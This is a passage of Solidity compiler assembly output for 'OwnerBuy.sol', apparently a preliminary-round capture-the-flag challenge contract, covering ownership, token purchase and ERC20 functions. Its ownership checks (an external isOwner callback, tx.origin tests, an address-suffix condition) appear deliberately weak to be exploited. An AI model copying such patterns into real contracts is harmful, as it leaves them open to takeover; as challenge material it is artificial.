(!tmp.isOwner(_owner)) {\r... */\n      tag_168\n      jumpi\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3804:3807  tmp */\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3804:3815  tmp.isOwner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2f54bf6e\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3816:3822  _owner */\n      dup4\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3804:3823  tmp.isOwner(_owner) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_169\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_169:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3804:3823  tmp.isOwner(_owner) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_170\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_170:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3804:3823  tmp.isOwner(_owner) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_171\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_171:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3804:3823  tmp.isOwner(_owner) */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3783:3789  status */\n      0x08\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3783:3801  status[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3790:3800  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3783:3801  status[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3783:3823  status[msg.sender] = tmp.isOwner(_owner) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3742:3835  if (!tmp.isOwner(_owner)) {\r... */\n    tag_168:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3640:3842  function changestatus(address _owner) public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3850:4115  function changeOwner() public {\r... */\n    tag_76:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3912:3922  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3899:3922  tx.origin != msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3899:3908  tx.origin */\n      origin\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3899:3922  tx.origin != msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3891:3923  require(tx.origin != msg.sender) */\n      tag_173\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_173:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3971:3977  0xffff */\n      0xffff\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3961:3967  0xffff */\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3947:3957  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3942:3958  uint(msg.sender) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3942:3967  uint(msg.sender) & 0xffff */\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3942:3977  uint(msg.sender) & 0xffff == 0xffff */\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3934:3978  require(uint(msg.sender) & 0xffff == 0xffff) */\n      tag_174\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_174:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4015:4019  true */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3993:4019  status[msg.sender] == true */\n      iszero\n      iszero\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3993:3999  status */\n      0x08\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3993:4011  status[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4000:4010  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3993:4011  status[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3993:4019  status[msg.sender] == true */\n      iszero\n      iszero\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3989:4108  if (status[msg.sender] == true) {\r... */\n      iszero\n      tag_175\n      jumpi\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4057:4062  false */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4036:4042  status */\n      0x08\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4036:4054  status[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4043:4053  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4036:4054  status[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4036:4062  status[msg.sender] = false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4086:4096  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4077:4083  _owner */\n      0x00\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4077:4096  _owner = msg.sender */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3989:4108  if (status[msg.sender] == true) {\r... */\n    tag_175:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3850:4115  function changeOwner() public {\r... */\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2567:2605  mapping(address => bool) public status */\n    tag_80:\n      mstore(0x20, 0x08)\n      dup1\n      0x00\n      mstore\n      keccak256(0x00, 0x40)\n      0x00\n      swap2\n      pop\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":311:340  address public _previousOwner */\n    tag_83:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1713:1823  function balanceOf(address account) public view returns (uint256) {\r... */\n    tag_87:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1770:1777  uint256 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1797:1806  _balances */\n      0x02\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1797:1815  _balances[account] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1807:1814  account */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1797:1815  _balances[account] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1790:1815  return _balances[account] */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1713:1823  function balanceOf(address account) public view returns (uint256) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1446:1586  function renounceOwnership() public onlyOwner {\r... */\n    tag_90:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1028:1038  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1024  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1010:1075  require(_owner == msg.sender, \"Ownable: caller is not the owner\") */\n      tag_178\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x20\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_178:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1545:1546  0 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1508:1548  OwnershipTransferred(_owner, address(0)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1529:1535  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1508:1548  OwnershipTransferred(_owner, address(0)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1576:1577  0 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1559:1565  _owner */\n      dup1\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1559:1578  _owner = address(0) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1446:1586  function renounceOwnership() public onlyOwner {\r... */\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":806:885  function owner() public view returns (address) {\r... */\n    tag_93:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":844:851  address */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":871:877  _owner */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":864:877  return _owner */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":806:885  function owner() public view returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":872:959  function symbol() public view returns (string memory) {\r... */\n    tag_96:\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":911:924  string memory */\n      0x60\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":944:951  _symbol */\n      0x06\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":937:951  return _symbol */\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_182\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_183\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_182)\n    tag_183:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_184:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_184\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_182:\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":872:959  function symbol() public view returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2831:2930  function isWhite(address addr) public view returns (bool) {\r... */\n    tag_104:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2883:2887  bool */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2907:2916  whiteList */\n      0x0a\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2907:2922  whiteList[addr] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2917:2921  addr */\n      dup4\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2907:2922  whiteList[addr] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2900:2922  return whiteList[addr] */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2831:2930  function isWhite(address addr) public view returns (bool) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4529:4745  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r... */\n    tag_108:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4614:4618  bool */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4631:4715  _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue)) */\n      tag_187\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4640:4650  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4652:4659  spender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4714  _allowances[msg.sender][spender].sub(subtractedValue) */\n      tag_188\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4698:4713  subtractedValue */\n      dup6\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4672  _allowances */\n      0x03\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4684  _allowances[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4673:4683  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4684  _allowances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4693  _allowances[msg.sender][spender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4685:4692  spender */\n      dup10\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4693  _allowances[msg.sender][spender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4697  _allowances[msg.sender][spender].sub */\n      tag_155\n      swap1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4714  _allowances[msg.sender][spender].sub(subtractedValue) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_188:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4631:4639  _approve */\n      tag_148\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4631:4715  _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue)) */\n      jump\t// in\n    tag_187:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4733:4737  true */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4726:4737  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4529:4745  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2325:2502  function unlock() external payable {\r... */\n    tag_110:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2392:2399  1 ether */\n      0x0de0b6b3a7640000\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2379:2388  msg.value */\n      callvalue\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2379:2399  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2371:2400  require(msg.value >= 1 ether) */\n      tag_190\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_190:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2445:2459  _previousOwner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2416:2460  OwnershipTransferred(_owner, _previousOwner) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2437:2443  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2416:2460  OwnershipTransferred(_owner, _previousOwner) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2480:2494  _previousOwner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2471:2477  _owner */\n      0x00\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2471:2494  _owner = _previousOwner */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2325:2502  function unlock() external payable {\r... */\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4123:4517  function buy() public payable returns (bool success) {\r... */\n    tag_112:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4162:4174  bool success */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4205:4247  0x220866B1A2219f40e72f5c628B65D54268cA3A9D */\n      0x220866b1a2219f40e72f5c628b65d54268ca3a9d\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4195:4247  _owner == 0x220866B1A2219f40e72f5c628B65D54268cA3A9D */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4195:4201  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4195:4247  _owner == 0x220866B1A2219f40e72f5c628B65D54268cA3A9D */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4187:4248  require(_owner == 0x220866B1A2219f40e72f5c628B65D54268cA3A9D) */\n      tag_192\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_192:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4280:4290  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4267:4290  tx.origin != msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4267:4276  tx.origin */\n      origin\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4267:4290  tx.origin != msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4259:4291  require(tx.origin != msg.sender) */\n      tag_193\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_193:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4331:4332  0 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4310:4315  Times */\n      0x09\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4310:4327  Times[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4316:4326  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4310:4327  Times[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4310:4332  Times[msg.sender] == 0 */\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4302:4333  require(Times[msg.sender] == 0) */\n      tag_194\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_194:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4377:4378  0 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4352:4361  _balances */\n      0x02\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4352:4373  _balances[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4362:4372  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4352:4373  _balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4352:4378  _balances[msg.sender] == 0 */\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4344:4379  require(_balances[msg.sender] == 0) */\n      tag_195\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_195:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4411:4416  1 wei */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4398:4407  msg.value */\n      callvalue\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4398:4416  msg.value == 1 wei */\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4390:4417  require(msg.value == 1 wei) */\n      tag_196\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_196:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4452:4455  100 */\n      0x64\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4428:4437  _balances */\n      0x02\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4428:4449  _balances[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4438:4448  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4428:4449  _balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4428:4455  _balances[msg.sender] = 100 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4486:4487  1 */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4466:4471  Times */\n      0x09\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4466:4483  Times[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4472:4482  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4466:4483  Times[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4466:4487  Times[msg.sender] = 1 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4505:4509  true */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4498:4509  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4123:4517  function buy() public payable returns (bool 